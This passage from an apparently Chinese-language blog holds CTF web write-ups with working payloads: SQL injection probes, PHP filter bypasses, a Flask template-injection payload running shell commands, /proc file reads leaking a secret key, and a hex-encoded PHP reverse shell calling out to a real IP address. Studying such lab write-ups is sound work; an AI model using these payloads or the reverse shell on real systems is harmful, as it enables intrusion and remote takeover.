class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Attempting to run command:&lt;br/&gt;&#x27;</span>;</span><br><span class="line">    <span class="variable">$cmd</span> = <span class="title function_ invoke__">json_decode</span>(<span class="variable">$json</span>, <span class="literal">true</span>)[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$cmd</span> !== <span class="literal">NULL</span>) &#123;</span><br><span class="line">      <span class="title function_ invoke__">system</span>(<span class="variable">$cmd</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&#x27;Invalid input&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;br/&gt;&lt;br/&gt;&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>preg_match对原来的字符串没有开启多行匹配, PATH环境变量被改了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=&#123;%0a&quot;cmd&quot;: &quot;/bin/cat /home/rceservice/flag&quot;%0a&#125;</span><br></pre></td></tr></table></figure><p>第二种解法时正则回溯最大次数绕过</p><h2 id="WUSTCTF2020-颜值成绩查询"><a href="#WUSTCTF2020-颜值成绩查询" class="headerlink" title="[WUSTCTF2020]颜值成绩查询"></a>[WUSTCTF2020]颜值成绩查询</h2><p>布尔注入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">stunum=if(1,2,1)</span><br><span class="line">stunum=1^2</span><br></pre></td></tr></table></figure><p>两种手法都能测出来, 之后就是编写脚本, 这里就不浪费时间了</p><h2 id="MRCTF2020-套娃"><a href="#MRCTF2020-套娃" class="headerlink" title="[MRCTF2020]套娃"></a>[MRCTF2020]套娃</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$query</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>];</span><br><span class="line"></span><br><span class="line"> <span class="keyword">if</span>( <span class="title function_ invoke__">substr_count</span>(<span class="variable">$query</span>, <span class="string">&#x27;_&#x27;</span>) !== <span class="number">0</span> || <span class="title function_ invoke__">substr_count</span>(<span class="variable">$query</span>, <span class="string">&#x27;%5f&#x27;</span>) != <span class="number">0</span> )&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Y0u are So cutE!&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"> <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;b_u_p_t&#x27;</span>] !== <span class="string">&#x27;23333&#x27;</span> &amp;&amp; <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^23333$/&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;b_u_p_t&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;you are going to the next ~&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?b%20u%20p%20t=23333%0a</span><br></pre></td></tr></table></figure><p>到secrettw.php</p><p>源码里有一点jsFuck, 运行一下</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240530144140854.png" alt="image-20240530144140854"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>); </span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;takeip.php&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;.&#x27;</span>); </span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;Merak&#x27;</span>]))&#123; </span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>); </span><br><span class="line">    <span class="keyword">die</span>(); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">change</span>(<span class="params"><span class="variable">$v</span></span>)</span>&#123; </span><br><span class="line">    <span class="variable">$v</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$v</span>); </span><br><span class="line">    <span class="variable">$re</span> = <span class="string">&#x27;&#x27;</span>; </span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$v</span>);<span class="variable">$i</span>++)&#123; </span><br><span class="line">        <span class="variable">$re</span> .= <span class="title function_ invoke__">chr</span> ( <span class="title function_ invoke__">ord</span> (<span class="variable">$v</span>[<span class="variable">$i</span>]) + <span class="variable">$i</span>*<span class="number">2</span> ); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$re</span>; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Local access only!&#x27;</span>.<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$ip</span> = <span class="title function_ invoke__">getIp</span>();</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ip</span>!=<span class="string">&#x27;127.0.0.1&#x27;</span>)</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Sorry,you don&#x27;t have permission!  Your ip is :&quot;</span>.<span class="variable">$ip</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ip</span> === <span class="string">&#x27;127.0.0.1&#x27;</span> &amp;&amp; <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;2333&#x27;</span>]) === <span class="string">&#x27;todat is a happy day&#x27;</span> )&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Your REQUEST is:&quot;</span>.<span class="title function_ invoke__">change</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="title function_ invoke__">change</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])); &#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>换ip用Client-IP: 127.0.0.1, 不过这里不回显ip, 但确实已经换掉了</p><p>之后是反算这个函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">change</span>(<span class="params"><span class="variable">$v</span></span>)</span>&#123; </span><br><span class="line">    <span class="variable">$v</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$v</span>); </span><br><span class="line">    <span class="variable">$re</span> = <span class="string">&#x27;&#x27;</span>; </span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$v</span>);<span class="variable">$i</span>++)&#123; </span><br><span class="line">        <span class="variable">$re</span> .= <span class="title function_ invoke__">chr</span> ( <span class="title function_ invoke__">ord</span> (<span class="variable">$v</span>[<span class="variable">$i</span>]) + <span class="variable">$i</span>*<span class="number">2</span> ); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$re</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">unchange</span>(<span class="params"><span class="variable">$v</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$re</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$v</span>);<span class="variable">$i</span>++)&#123; </span><br><span class="line">        <span class="variable">$re</span> .= <span class="title function_ invoke__">chr</span> ( <span class="title function_ invoke__">ord</span> (<span class="variable">$v</span>[<span class="variable">$i</span>]) - <span class="variable">$i</span>*<span class="number">2</span> ); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$re</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">unchange</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br></pre></td></tr></table></figure><p>poc:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/secrettw.php?2333=php://input&amp;file=ZmpdYSZmXGI=</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>d3663114-3245-44e1-9628-79b302dcc843.node5.buuoj.cn:81</span><br><span class="line"><span class="attribute">Pragma</span><span class="punctuation">: </span>no-cache</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>no-cache</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Client-IP</span><span class="punctuation">: </span>127.0.0.1</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>20</span><br><span class="line"></span><br><span class="line"><span class="language-applescript">todat <span class="keyword">is</span> a happy <span class="built_in">day</span></span></span><br></pre></td></tr></table></figure><h2 id="Zer0pts2020-Can-you-guess-it"><a href="#Zer0pts2020-Can-you-guess-it" class="headerlink" title="[Zer0pts2020]Can you guess it?"></a>[Zer0pts2020]Can you guess it?</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;config.php&#x27;</span>; <span class="comment">// FLAG is defined in config.php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/config\.php\/*$/i&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>])) &#123;</span><br><span class="line">  <span class="keyword">exit</span>(<span class="string">&quot;I don&#x27;t know what you are thinking, but I won&#x27;t let you read it :)&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>])) &#123;</span><br><span class="line">  <span class="title function_ invoke__">highlight_file</span>(<span class="title function_ invoke__">basename</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>]));</span><br><span class="line">  <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$secret</span> = <span class="title function_ invoke__">bin2hex</span>(<span class="title function_ invoke__">random_bytes</span>(<span class="number">64</span>));</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;guess&#x27;</span>])) &#123;</span><br><span class="line">  <span class="variable">$guess</span> = (<span class="keyword">string</span>) <span class="variable">$_POST</span>[<span class="string">&#x27;guess&#x27;</span>];</span><br><span class="line">  <span class="keyword">if</span> (<span class="title function_ invoke__">hash_equals</span>(<span class="variable">$secret</span>, <span class="variable">$guess</span>)) &#123;</span><br><span class="line">    <span class="variable">$message</span> = <span class="string">&#x27;Congratulations! The flag is: &#x27;</span> . FLAG;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$message</span> = <span class="string">&#x27;Wrong.&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这题之前已经见过了, 直接看payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php/config.php/%ff?source</span><br></pre></td></tr></table></figure><p>basename会返回config.php这个字符串, 利用%ff绕过preg_match </p><blockquote><p>网址：<a href="https://www.example.com/php/index.php/test/foo?username=root">https://www.example.com/php/index.php/test/foo?username=root</a></p><p>$_SERVER[‘PHP_SELF’] 得到：&#x2F;php&#x2F;index.php&#x2F;test&#x2F;foo<br>$_SERVER[‘SCRIPT_NAME’] 得到：&#x2F;php&#x2F;index.php<br>$_SERVER[‘REQUEST_URI’] 得到：&#x2F;php&#x2F;index.php&#x2F;test&#x2F;foo?username&#x3D;root</p></blockquote><h2 id="CSCCTF-2019-Qual-FlaskLight"><a href="#CSCCTF-2019-Qual-FlaskLight" class="headerlink" title="[CSCCTF 2019 Qual]FlaskLight"></a>[CSCCTF 2019 Qual]FlaskLight</h2><p>Fenjin秒了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;cycler.next[&#x27;__g&#x27;&#x27;lobals__&#x27;].__builtins__.__import__(&#x27;os&#x27;).popen(&#x27;cat /flasklight/coomme_geeeett_youur_flek&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure><h2 id="红明谷CTF-2021-write-shell"><a href="#红明谷CTF-2021-write-shell" class="headerlink" title="[红明谷CTF 2021]write_shell"></a>[红明谷CTF 2021]write_shell</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$input</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/&#x27;| |_|php|;|~|\\^|\\+|eval|&#123;|&#125;/i&quot;</span>,<span class="variable">$input</span>))&#123;</span><br><span class="line">        <span class="comment">// if(preg_match(&quot;/&#x27;| |_|=|php/&quot;,$input))&#123;</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;hacker!!!&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$input</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$input</span></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(<span class="variable">$input</span>))&#123;</span><br><span class="line">      <span class="keyword">foreach</span>(<span class="variable">$input</span> <span class="keyword">as</span> <span class="variable">$key</span>=&gt;<span class="variable">$output</span>)&#123;</span><br><span class="line">          <span class="variable">$input</span>[<span class="variable">$key</span>] = <span class="title function_ invoke__">waf</span>(<span class="variable">$output</span>);</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="variable">$input</span> = <span class="title function_ invoke__">check</span>(<span class="variable">$input</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$dir</span> = <span class="string">&#x27;sandbox/&#x27;</span> . <span class="title function_ invoke__">md5</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]) . <span class="string">&#x27;/&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">file_exists</span>(<span class="variable">$dir</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">mkdir</span>(<span class="variable">$dir</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">switch</span>(<span class="variable">$_GET</span>[<span class="string">&quot;action&quot;</span>] ?? <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;pwd&#x27;</span>:</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$dir</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;upload&#x27;</span>:</span><br><span class="line">        <span class="variable">$data</span> = <span class="variable">$_GET</span>[<span class="string">&quot;data&quot;</span>] ?? <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="title function_ invoke__">waf</span>(<span class="variable">$data</span>);</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;<span class="subst">$dir</span>&quot;</span> . <span class="string">&quot;index.php&quot;</span>, <span class="variable">$data</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>hex编码一下执行php</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r &#x27;$sock=fsockopen(&quot;107.148.75.202&quot;,1234);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?action=upload&amp;data=&lt;?=exec(hex2bin(&quot;706870202d72202724736f636b3d66736f636b6f70656e28223130372e3134382e37352e323032222c31323334293b6578656328222f62696e2f7368202d69203c2633203e263320323e263322293b27&quot;))?&gt;</span><br></pre></td></tr></table></figure><p>flag在根目录</p><h2 id="网鼎杯-2020-白虎组-PicDown"><a href="#网鼎杯-2020-白虎组-PicDown" class="headerlink" title="[网鼎杯 2020 白虎组]PicDown"></a>[网鼎杯 2020 白虎组]PicDown</h2><p>有这样一个参数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/page?url=</span><br></pre></td></tr></table></figure><p>一开始按ssrf做发现file协议读取不了任何文件, 也探测不到其他端口的开放</p><p>看了WP才发现原来用的是python2的<code>urllib</code>的<code>urlopen</code>，和<code>urllib2</code>中的<code>urlopen</code>明显区别就是<code>urllib.urlopen</code>支持将路径作为参数去打开对应的本地路径，所以可以直接填入路径读取文件</p><p>不知道怎么看出来的python2的urllib, 只能看到响应头  Server: openresty</p><p>首先可以读当前的服务 &#x2F;proc&#x2F;self&#x2F;cmdline  </p><p>读取web服务的源码 &#x2F;page?url&#x3D;&#x2F;app&#x2F;app.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, Response</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> render_template</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">SECRET_FILE = <span class="string">&quot;/tmp/secret.txt&quot;</span></span><br><span class="line">f = <span class="built_in">open</span>(SECRET_FILE)</span><br><span class="line">SECRET_KEY = f.read().strip()</span><br><span class="line">os.remove(SECRET_FILE)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;search.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/page&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">page</span>():</span><br><span class="line">    url = request.args.get(<span class="string">&quot;url&quot;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> url.lower().startswith(<span class="string">&quot;file&quot;</span>):</span><br><span class="line">            res = urllib.urlopen(url)</span><br><span class="line">            value = res.read()</span><br><span class="line">            response = Response(value, mimetype=<span class="string">&#x27;application/octet-stream&#x27;</span>)</span><br><span class="line">            response.headers[<span class="string">&#x27;Content-Disposition&#x27;</span>] = <span class="string">&#x27;attachment; filename=beautiful.jpg&#x27;</span></span><br><span class="line">            <span class="keyword">return</span> response</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            value = <span class="string">&quot;HACK ERROR!&quot;</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        value = <span class="string">&quot;SOMETHING WRONG!&quot;</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;search.html&#x27;</span>, res=value)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/no_one_know_the_manager&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">manager</span>():</span><br><span class="line">    key = request.args.get(<span class="string">&quot;key&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(SECRET_KEY)</span><br><span class="line">    <span class="keyword">if</span> key == SECRET_KEY:</span><br><span class="line">        shell = request.args.get(<span class="string">&quot;shell&quot;</span>)</span><br><span class="line">        os.system(shell)</span><br><span class="line">        res = <span class="string">&quot;ok&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        res = <span class="string">&quot;Wrong Key!&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">8080</span>)</span><br></pre></td></tr></table></figure><p>我们需要知道SECRET_KEY的内容才能得到shell</p><p>下面是它的由来</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SECRET_FILE = <span class="string">&quot;/tmp/secret.txt&quot;</span></span><br><span class="line">f = <span class="built_in">open</span>(SECRET_FILE)</span><br><span class="line">SECRET_KEY = f.read().strip()</span><br><span class="line">os.remove(SECRET_FILE)</span><br></pre></td></tr></table></figure><p>这里读取后删除了txt, 但是并没有关闭这个f, 因此可以在&#x2F;proc&#x2F;self&#x2F;fd&#x2F;[num]中读取到内容</p><p>遍历一下num即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/page?url=/proc/self/fd/3</span><br></pre></td></tr></table></figure><p>读到key内容为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">6mjoys/T/kzPpBeY3iDkOr0wcuHIm9Ake8ygyiKhAfQ=</span><br></pre></td></tr></table></figure><p>由于无回显, 反弹shell即可</p><p> 当然还有一个非预期是直接读取&#x2F;flag</p><p>flag{4d855645-f351-4353-af7c-1a993e5b92ab}</p><h2 id="WUSTCTF2020-CV-Maker"><a href="#WUSTCTF2020-CV-Maker" class="headerlink" title="[WUSTCTF2020]CV Maker"></a>[WUSTCTF2020]CV Maker</h2><p>注册登录, 上传头像处getshell</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>第二届黄河流域安全技能挑战赛Web</title>
      <link href="/2024/05/30/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E9%BB%84%E6%B2%B3%E6%B5%81%E5%9F%9F%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E6%8C%91%E6%88%98%E8%B5%9BWeb/"/>
      <url>/2024/05/30/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E9%BB%84%E6%B2%B3%E6%B5%81%E5%9F%9F%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E6%8C%91%E6%88%98%E8%B5%9BWeb/</url>
      
